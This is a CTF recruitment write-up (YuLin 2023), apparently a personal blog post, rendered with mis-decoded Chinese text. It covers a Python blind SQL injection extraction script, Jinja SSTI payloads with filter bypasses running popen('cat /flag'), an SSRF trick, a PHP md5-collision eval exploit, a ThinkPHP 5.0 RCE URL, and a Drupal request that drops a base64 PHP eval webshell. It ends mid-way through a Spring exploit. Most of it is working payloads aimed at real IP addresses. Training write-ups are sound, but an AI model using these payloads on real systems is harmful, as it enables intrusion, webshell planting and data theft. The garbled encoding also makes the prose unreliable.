101</p><p>okæŸ¥å‡ºæ¥æ˜¯security</p><p>å‘ç°æä¸å®šå•Š,è¿™å·¥ç¨‹é‡ã€‚ã€‚ã€‚è¿˜å¾—ä¸Šè„šæœ¬</p><p>import requests</p><h1 id="åªéœ€è¦ä¿®æ”¹url-å’Œ-ä¸¤ä¸ªpayloadå³å¯"><a href="#åªéœ€è¦ä¿®æ”¹url-å’Œ-ä¸¤ä¸ªpayloadå³å¯" class="headerlink" title="åªéœ€è¦ä¿®æ”¹url å’Œ ä¸¤ä¸ªpayloadå³å¯"></a>åªéœ€è¦ä¿®æ”¹url å’Œ ä¸¤ä¸ªpayloadå³å¯</h1><h1 id="ç›®æ ‡ç½‘å€ï¼ˆä¸å¸¦å‚æ•°ï¼‰"><a href="#ç›®æ ‡ç½‘å€ï¼ˆä¸å¸¦å‚æ•°ï¼‰" class="headerlink" title="ç›®æ ‡ç½‘å€ï¼ˆä¸å¸¦å‚æ•°ï¼‰"></a>ç›®æ ‡ç½‘å€ï¼ˆä¸å¸¦å‚æ•°ï¼‰</h1><p>url &#x3D; â€œ<a href="http://43.142.109.233:20003/">http://43.142.109.233:20003/</a>â€œ</p><h1 id="çŒœè§£é•¿åº¦ä½¿ç”¨çš„payload"><a href="#çŒœè§£é•¿åº¦ä½¿ç”¨çš„payload" class="headerlink" title="çŒœè§£é•¿åº¦ä½¿ç”¨çš„payload"></a>çŒœè§£é•¿åº¦ä½¿ç”¨çš„payload</h1><p>payload_len &#x3D; â€œâ€â€?id&#x3D;1 and length(<br>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  (database())<br>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  ) &lt; {n} â€œâ€â€</p><h1 id="æšä¸¾å­—ç¬¦ä½¿ç”¨çš„payload"><a href="#æšä¸¾å­—ç¬¦ä½¿ç”¨çš„payload" class="headerlink" title="æšä¸¾å­—ç¬¦ä½¿ç”¨çš„payload"></a>æšä¸¾å­—ç¬¦ä½¿ç”¨çš„payload</h1><p>payload_str &#x3D; â€œâ€â€?id&#x3D;1 and ascii(<br>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  substr(<br>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  (database())<br>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  ,{n},1)<br>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  ) &#x3D; {r} â€œâ€â€</p><h1 id="è·å–é•¿åº¦"><a href="#è·å–é•¿åº¦" class="headerlink" title="è·å–é•¿åº¦"></a>è·å–é•¿åº¦</h1><p>def getLength(url, payload):<br>Â Â Â  length &#x3D; 1Â  # åˆå§‹æµ‹è¯•é•¿åº¦ä¸º1<br>Â Â Â  while True:<br>Â Â Â Â Â Â Â  response &#x3D; requests.get(url&#x3D; url+payload_len.format(n&#x3D; length))</p><p>Â Â Â Â Â Â Â  # é¡µé¢ä¸­å‡ºç°æ­¤å†…å®¹åˆ™è¡¨ç¤ºæˆåŠŸ</p><p>Â Â Â Â Â Â Â  if â€˜OKâ€™ in response.text:<br>Â Â Â Â Â Â Â Â Â Â Â  print(â€˜æµ‹è¯•é•¿åº¦å®Œæˆï¼Œé•¿åº¦ä¸ºï¼šâ€™, length,)<br>Â Â Â Â Â Â Â Â Â Â Â  return length;<br>Â Â Â Â Â Â Â  else:<br>Â Â Â Â Â Â Â Â Â Â Â  print(â€˜æ­£åœ¨æµ‹è¯•é•¿åº¦ï¼šâ€™,length)<br>Â Â Â Â Â Â Â Â Â Â Â  length +&#x3D; 1Â  # æµ‹è¯•é•¿åº¦é€’å¢</p><h1 id="è·å–å­—ç¬¦"><a href="#è·å–å­—ç¬¦" class="headerlink" title="è·å–å­—ç¬¦"></a>è·å–å­—ç¬¦</h1><p>def getStr(url, payload, length):<br>Â Â Â  str &#x3D; â€˜â€™Â  # åˆå§‹è¡¨å&#x2F;åº“åä¸ºç©º</p><p>Â Â Â  # ç¬¬ä¸€å±‚å¾ªç¯ï¼Œæˆªå–æ¯ä¸€ä¸ªå­—ç¬¦</p><p>Â Â Â  for l in range(1, length+1):</p><p>Â Â Â Â Â Â Â  # ç¬¬äºŒå±‚å¾ªç¯ï¼Œæšä¸¾æˆªå–å­—ç¬¦çš„æ¯ä¸€ç§å¯èƒ½æ€§</p><p>Â Â Â Â Â Â Â  for n in range(33, 126):<br>Â Â Â Â Â Â Â Â Â Â Â  response &#x3D; requests.get(url&#x3D; url+payload_str.format(n&#x3D; l, r&#x3D; n))</p><p>Â Â Â Â Â Â Â Â Â Â Â  # é¡µé¢ä¸­å‡ºç°æ­¤å†…å®¹åˆ™è¡¨ç¤ºæˆåŠŸ</p><p>Â Â Â Â Â Â Â Â Â Â Â  if â€˜OKâ€™ in response.text:<br>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  str+&#x3D; chr(n)<br>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  print(â€˜ç¬¬â€™, l, â€˜ä¸ªå­—ç¬¦çŒœè§£æˆåŠŸï¼šâ€™, str)<br>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  break;<br>Â Â Â  return str;</p><h1 id="å¼€å§‹çŒœè§£"><a href="#å¼€å§‹çŒœè§£" class="headerlink" title="å¼€å§‹çŒœè§£"></a>å¼€å§‹çŒœè§£</h1><p>length &#x3D; getLength(url, payload_len)<br>getStr(url, payload_str, length)</p><p>æ¯æ¬¡è¦æ”¹çš„åœ°æ–¹åªæœ‰æ ‡çº¢çš„åŒºåŸŸ</p><ol><li></li></ol><p>database()</p><p>çˆ†å‡ºæ¥è¡¨åä¸ºsecurity</p><ol start="2"><li></li></ol><p>è¿™é‡Œå…ˆæ‰‹åŠ¨å¯¹å½“å‰æ•°æ®åº“çˆ†è¡¨çš„æ•°é‡ï¼Œå¾ˆæ–¹ä¾¿</p><p><a href="http://43.142.109.233:20003/?id=1">http://43.142.109.233:20003/?id=1</a><br>and (select COUNT(*) from information_schema.tables where<br>table_schema&#x3D;database())&#x3D;5</p><p>çˆ†å‡ºæ¥æ˜¯5</p><ol start="3"><li></li></ol><p>select<br>table_name from information_schema.tables where table_schema &#x3D; database() limit<br>0,1</p><p>select<br>table_name from information_schema.tables where table_schema &#x3D; database() limit<br>0,1</p><p>ç¬¬ä¸€ä¸ªè¡¨</p><p>referers</p><p>select<br>table_name from information_schema.tables where table_schema &#x3D; database() limit 1,1</p><p>select<br>table_name from information_schema.tables where table_schema &#x3D; database() limit 1,1</p><p>åªæ”¹limitåé¢çš„æ•°å°±å®Œäº‹</p><p>ç¬¬äºŒä¸ªè¡¨</p><p>emails</p><p>ä»¥æ­¤æ¨ç±»</p><p>ç¬¬ä¸‰ä¸ªè¡¨users</p><p>ç¬¬å››ä¸ªè¡¨flag</p><p>ç¬¬äº”ä¸ªè¡¨ å°±ä¸æŸ¥äº†</p><p>4.æ‰‹åŠ¨çˆ†ä¸€äº›usersçš„åˆ—æ•°é‡</p><p><a href="http://43.142.109.233:20003/?id=1">http://43.142.109.233:20003/?id=1</a><br>and (select COUNT(*) from information_schema.columns where<br>table_schema&#x3D;database() and table_name&#x3D;â€usersâ€)&#x3D;3</p><p>çˆ†å‡ºæ¥æ˜¯3</p><p>æ³¨æ„è¿™é‡Œè¦ç”¨åŒå¼•å·ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºå•¥ã€‚ã€‚</p><ol start="5"><li></li></ol><p>select<br>column_name from information_schema.columns where table_schema &#x3D; database() and<br>table_name &#x3D;â€usersâ€ limit 0,1</p><p>select<br>column_name from information_schema.columns where table_schema &#x3D; database() and<br>table_name&#x3D;â€usersâ€ limit 0,1</p><p>select<br>column_name from information_schema.columns where table_schema &#x3D; database() and<br>table_name&#x3D;â€usersâ€ limit 0,1</p><p>æµ‹å‡ºuersç¬¬ä¸€åˆ—:id</p><p>æµ‹å‡ºuersç¬¬ä¸‰åˆ—:</p><p>æµ‹å‡ºuersç¬¬ä¸‰åˆ—:password</p><p>ä¸æµ‹äº†ï¼Œæ‰å‘ç°å‰é¢æé”™äº† flagå·²ç»æ•´å‡ºæ¥äº†</p><p>é‚£å°±é‡å¤è¿™äº›æ­¥éª¤æ‰¾flagçš„åˆ—</p><p>æµ‹å‡ºflagç¬¬äºŒåˆ—flag</p><ol start="6"><li></li></ol><p>select<br>flag from flag limit 0,1</p><p>ç»ˆäºçˆ†å‡ºæ¥äº†</p><p>å¯èƒ½æ˜¯æˆ‘è„šæœ¬çš„é—®é¢˜ï¼Œé€Ÿåº¦æ˜¯é¾Ÿé€Ÿï¼Œé è„šæœ¬è¿˜æ˜¯èŠ±äº†å¥½ä¹…æ—¶é—´ï¼Œä¸è¿‡åªæ˜¯ä¸ºäº†è§£å‡ºé¢˜é‚£ç¬é—´çš„å¤šå·´èƒºåˆ†æ³Œå¸¦æ¥çš„å¿«æ„Ÿï¼Œä¹Ÿæ˜¯å€¼å¾—çš„</p><p>æ‰¾æœ‹å‹è¦äº†ä¸ªæ›´å¿«çš„è‡ªåŠ¨åŒ–è„šæœ¬</p><ol start="4"><li></li></ol><p>è¿˜æ˜¯æ•´å½¢é—­åˆ</p><p>åœ¨æœ‹å‹è„šæœ¬çš„åŸºç¡€ä¸Šæ”¹äº†ä¸€ä¸‹åšå‡ºæ¥äº†</p><p>ä¸è¿‡ç²¾ç¡®åº¦ä¸é«˜</p><p>å»¶æ—¶ç›²æ³¨çš„ä¸€äº›è¯­å¥ï¼š</p><p>â€œ1<br>and if((select count(table_name) from<br>information_schema.tables where table_schema &#x3D; â€˜database()â€™) &#x3D; 1,sleep(2),1)</p><p>ä¸»è¦æ˜¯è¿ç”¨ifä¸‰å…ƒå¼å’Œsleepçš„åŸç†</p><p>YulinSec{0kfjtXaE8VJxXFG9BjZSy0Yn6dVLLMwbQ3OiaI20}</p><ol start="5"><li></li></ol><p>è¿˜ä¸ä¼š</p><p>Babyurl</p><p>è€ƒå¯Ÿssrf</p><p>urls&#x3D;<a href="http://127.0.0.1/flag.php">http://0x7F.0.0.1/flag.php</a></p><p><code>SSTI</code></p><p><code>1.</code></p><p><code>1.&#123;&#123;''.__class__&#125;&#125;Â Â  # è·å¾—å•å¼•å·çš„ç±»å‹</code></p><p><code>2.&#123;&#123;''.__class__.__base__&#125;&#125; #è·å¾—object</code></p><p><code>3.&#123;&#123;''.__class__.__base__.__subclasses__()&#125;&#125;#è·å¾—åŸºç±»</code></p><p><code>è¿™é‡Œè¦å†™ä¸ªè„šæœ¬å¾—åˆ°os._wrap_closeçš„é”®å€¼</code></p><p><code>4.&#123;&#123;''.__class__.__base__.__subclasses__()[127]&#125;&#125;#è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨çš„æ˜¯&lt;class</code><br><code>&#39;os._wrap_close&#39;&gt;ç±»</code></p><p><code>5.&#123;&#123;''.__class__.__base__.__subclasses__()[127].__init__.__globals__&#125;&#125;#å°†è¯¥ç±»å®ä¾‹åŒ–å¹¶ä¸”å…¨å±€æœç´¢æŸ¥æ‰¾æ‰€æœ‰çš„æ–¹æ³•ã€å˜é‡å’Œå‚æ•°</code></p><p><code>6.&#123;&#123;''.__class__.__base__.__subclasses__()[127].__init__.__globals__['popen']('ls').read()&#125;&#125;#åˆ©ç”¨popenå‡½æ•°æ‰§è¡Œå‘½ä»¤</code></p><p><code>7.&#123;&#123;''.__class__.__base__.__subclasses__()[127].__init__.__globals__['popen']('catflag').read()&#125;&#125;#æœ€åè·å¾—flag</code></p><p><code>ä¸æ˜¯ç›´æ¥catï¼Œä½†å·®ä¸å¤šå§</code></p><p><code>2.</code></p><p><code>è¿‡æ»¤&#123;&#123;``ç”¨&#123;%print(æ¥ä»£æ›¿``æ¯”å¦‚``&#123;%print(''.__class__)%&#125;``ç„¶åæŒ‰ç¬¬ä¸€é¢˜æ€è·¯å°±è¡Œ``&#123;%print(''.__class__.__base__.__subclasses__()[127]) .__init__.__globals__['popen']('cat/flag').read()%&#125;``3.``è¿‡æ»¤[]ï¼Œç”¨getitem``&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(127).__init__.__globals__.__getitem__('popen')('ls').read()&#125;&#125;</code></p><p><code>&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(127).__init__.__globals__.__getitem__('popen')('cat``/flag').read()&#125;&#125;</code></p><p><code>4.</code></p><p><code>è¿‡æ»¤ä¸‹åˆ’çº¿</code></p><p><code>ç”¨16è¿›åˆ¶ç¼–ç ç»•è¿‡</code></p><p><code>&#123;&#123;()['\x5f\x5fclass\x5f\x5f']['\x5f\x5fbase\x5f\x5f']['\x5f\x5fsubclasses\x5f\x5f']()[127]['\x5f\x5finit\x5f\x5f']['\x5f\x5fglobals\x5f\x5f']['popen']('cat``/flag').read() &#125;&#125;</code></p><p><code>5.</code></p><p><code>è¿‡æ»¤å•åŒå¼•å·</code></p><p><code>&#123;&#123;[].__class__.__mro__[1].__subclasses__()[127].__init__.__globals__[request.args.a](request.args.b).read()&#125;&#125;   åŒæ—¶getä¼ å‚?a=popen&amp;b=cat /flag</code></p><p><code>6ï¼</code></p><p><code>è¿‡æ»¤å°æ•°ç‚¹</code></p><p><code>&#123;&#123;()['__class__']['__base__']['__subclasses__']()[127]['__init__']['__globals__']['popen']('cat``/flag')['read']()&#125;&#125;</code></p><p><code>7.</code></p><p><code>è¿‡æ»¤äº†ä¸€å †å…³é”®å­—</code></p><p><code>&#123;&#123;()['__cla'+'ss__']['__ba'+'se__']['__subcl'+'asses__']()[127]['__in'+'it__']['__glo'+'bals__']['pop'+'en']('c'+'at``/fl'+'ag')['re'+'ad']()&#125;&#125;</code></p><p><code>#</code> </p><h1 id="part2"><a href="#part2" class="headerlink" title="part2:"></a>part2:</h1><h1 id="YuLin-2023-Recruit-Writeup-part-2"><a href="#YuLin-2023-Recruit-Writeup-part-2" class="headerlink" title="YuLin 2023 Recruit Writeup part 2"></a>YuLin 2023 Recruit Writeup part 2</h1><p>wordå¤ªéš¾ç”¨äº†ï¼Œäºæ˜¯part2éƒ½ç”¨mdæ¥å†™</p><h2 id="Easy-ç›’æ­¦å™¨"><a href="#Easy-ç›’æ­¦å™¨" class="headerlink" title="[Easy]ç›’æ­¦å™¨"></a>[Easy]ç›’æ­¦å™¨</h2><h3 id="picture1"><a href="#picture1" class="headerlink" title="picture1"></a>picture1</h3><p>è¯†å›¾å‡ºæ¥ï¼šæ­¦æ±‰ç†å·¥å¤§å­¦å—æ¹–æ ¡åŒºå¿ƒè‡³æ¥¼</p><h3 id="picture2"><a href="#picture2" class="headerlink" title="picture2"></a>picture2</h3><p>åœ¨åœ°å›¾é™„ä»¶æ‰¾æ­¦æ±‰é•¿æ±Ÿå¤§æ¡¥çš„å…¬å›­</p><p>è¯•å‡ºæ¥ï¼šæ¹–åŒ—çœæ­¦æ±‰å¸‚æ±‰é˜³åŒºé¾Ÿå±±åŒ—è·¯5å·é¾Ÿå±±é£æ™¯åŒº</p><p>çœ‹å‡ºé¢˜äººç©ºé—´æ‰¾åˆ°10.4åˆ°10.5çš„æ­¦æ±‰æ¸¸ç©ä¿¡æ¯</p><p>ç©·ä¸¾è¯•å‡ºæ¥ï¼š2023å¹´10æœˆ05æ—¥18æ—¶</p><h2 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) == <span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;flag1: &#x27;</span>.<span class="variable">$flag1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;a is not equal to b&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;Yu&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;lin&#x27;</span>] &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Yu&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;lin&#x27;</span>]))) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Yu&#x27;</span>]);</span><br><span class="line">    <span class="comment">//cat /flag2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒä¸ªflagè€ƒå¯Ÿfastcollï¼Œç”¨fastcollç”Ÿæˆä¸¤ä¸ªmd5ç›¸åŒçš„å­—ç¬¦ä¸²ï¼Œç”±äºæœ‰ä¸å¯è§å­—ç¬¦ï¼Œè¦urlç¼–ç ä¹‹ågetä¼ å‚</p><p>æ³¨æ„è¿™é‡Œæ ¹æ®é¢˜ç›®è¦æ±‚ï¼Œç”Ÿæˆæ–‡ä»¶è¦ç”¨system(â€˜cat &#x2F;flag2â€™);#</p><p>#ç”¨äºæˆªæ–­ï¼Œevalåªæ‰§è¡Œsystem(â€˜cat &#x2F;flag2â€™);</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readmyfile</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line"> <span class="variable">$fh</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$path</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line"> <span class="variable">$data</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$fh</span>, <span class="title function_ invoke__">filesize</span>(<span class="variable">$path</span>));</span><br><span class="line"> <span class="title function_ invoke__">fclose</span>(<span class="variable">$fh</span>);</span><br><span class="line"> <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">readmyfile</span>(<span class="string">&quot;G:\php\app\php-7.4.5-Win32-vc15-x64\a_msg1.txt&quot;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">readmyfile</span>(<span class="string">&quot;G:\php\app\php-7.4.5-Win32-vc15-x64\a_msg2.txt&quot;</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>))===<span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;a:&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)!=<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;b:&quot;</span>;    </span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;a url ç¼–ç çš„MD5:&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;a url ç¼–ç çš„MD5:&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;å¤åˆ¶a url çš„MD5&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&quot;leon%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%1FU%F8%24%DA%25Q%F8j%FE%21%F9u%3D9%88%08%11%BC9s%97%CC%E1%18%C2%80E%B0%1D%0Cw%A1%EB%FE%BD%CC%CE%1A%8C%0B%C8%F7%02%E3%F1%09o%84%A8%E6n%E0%1F%8E%7B%17l%01W%DF%FD%40eu%D9%E6f%12%AA%98Z%7F%9A%C1%2A%D9i%CB%0CE%F2X%18%8A%CD%FE%1C+%29%AF%07J%7C%F1%BD%8D_%7Bd%D4%DA%B0%87%22%1D%05%D2%99L%05%3F%CA%84%10%B1%B6%D6%C3qr%29%12m%ED%C4%D0%FB&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;å¤åˆ¶b url çš„MD5&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&quot;leon%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%1FU%F8%24%DA%25Q%F8j%FE%21%F9u%3D9%88%08%11%BC%B9s%97%CC%E1%18%C2%80E%B0%1D%0Cw%A1%EB%FE%BD%CC%CE%1A%8C%0B%C8%F7%02%E3q%0Ao%84%A8%E6n%E0%1F%8E%7B%17l%01%D7%DF%FD%40eu%D9%E6f%12%AA%98Z%7F%9A%C1%2A%D9i%CB%0CE%F2X%98%8A%CD%FE%1C+%29%AF%07J%7C%F1%BD%8D_%7Bd%D4%DA%B0%87%22%1D%05%D2%99%CC%04%3F%CA%84%10%B1%B6%D6%C3qr%29%12%ED%ED%C4%D0%FB&quot;</span>);</span><br><span class="line"><span class="variable">$code</span>=<span class="string">&quot;echo 1234 ;#efsdghfgj&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$code</span>&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://43.142.109.233:2003/?Yu=system%28%27cat+%2Fflag2%27%29%3B%23%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00f%AB%0F%AE%F7%7C%8DQ8%AA%84%A7Z%06%AD%E8%91F%DE%8DL%D5AUE%B27A%8C%06%89w%3D%BB%AD%CF%F2%28Mp%8F%F0%D5%1C%A0%C9%EAZd%DA%F7%7D%8C%05%ED4%9B%ECXE%88%2F%9F%C5%BA%E8%BAX%2F.%DD%B9%BDJ%B3%7C%96G%3C%3B%A7A%C1x8%9B1%B2%AB%C30%B8%A6_%88%A8%D7%BD%EA%E7%9F%043%FE5%40%0C4Q%F8%F9%C3%B2%EFwp%8AQv%3D%C7aq%BFV%F5%86X&amp;lin=system%28%27cat+%2Fflag2%27%29%3B%23%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00f%AB%0F%AE%F7%7C%8DQ8%AA%84%A7Z%06%AD%E8%91F%DE%0DL%D5AUE%B27A%8C%06%89w%3D%BB%AD%CF%F2%28Mp%8F%F0%D5%1C%A0I%EBZd%DA%F7%7D%8C%05%ED4%9B%ECX%C5%88%2F%9F%C5%BA%E8%BAX%2F.%DD%B9%BDJ%B3%7C%96G%3C%3B%A7A%C1%F88%9B1%B2%AB%C30%B8%A6_%88%A8%D7%BD%EA%E7%9F%043%FE5%40%0C4Qx%F9%C3%B2%EFwp%8AQv%3D%C7aq%3FV%F5%86X</span><br></pre></td></tr></table></figure><h2 id="EASY-Script-Kiddie"><a href="#EASY-Script-Kiddie" class="headerlink" title="[EASY]Script Kiddie"></a>[EASY]Script Kiddie</h2><p>æ—¢ç„¶å½“è„šæœ¬å°å­æˆ‘å°±åªæ±‚ç»“æœäº†ï¼ˆ</p><h3 id="thinkphp-5-0"><a href="#thinkphp-5-0" class="headerlink" title="thinkphp 5.0"></a>thinkphp 5.0</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure><h3 id="drupal"><a href="#drupal" class="headerlink" title="drupal"></a>drupal</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>121.5.35.176:30003</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>173</span><br><span class="line"></span><br><span class="line"><span class="language-prolog">form_id=user_register_form&amp;<span class="symbol">_drupal_ajax</span>=<span class="number">1</span>&amp;mail[#post_render][]=exec&amp;mail[#type]=markup&amp;mail[#markup]=echo <span class="string">&quot;PD9waHAgZXZhbCgkX1JFUVVFU1RbOF0pIDs/Pg==&quot;</span> |base64 -d |tee test.php</span></span><br></pre></td></tr></table></figure><p>é…åˆä½¿ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://121.5.35.176:30003/test.php?8=system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure><h3 id="spring"><a href="#spring" class="headerlink" title="spring"></a>spring</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span 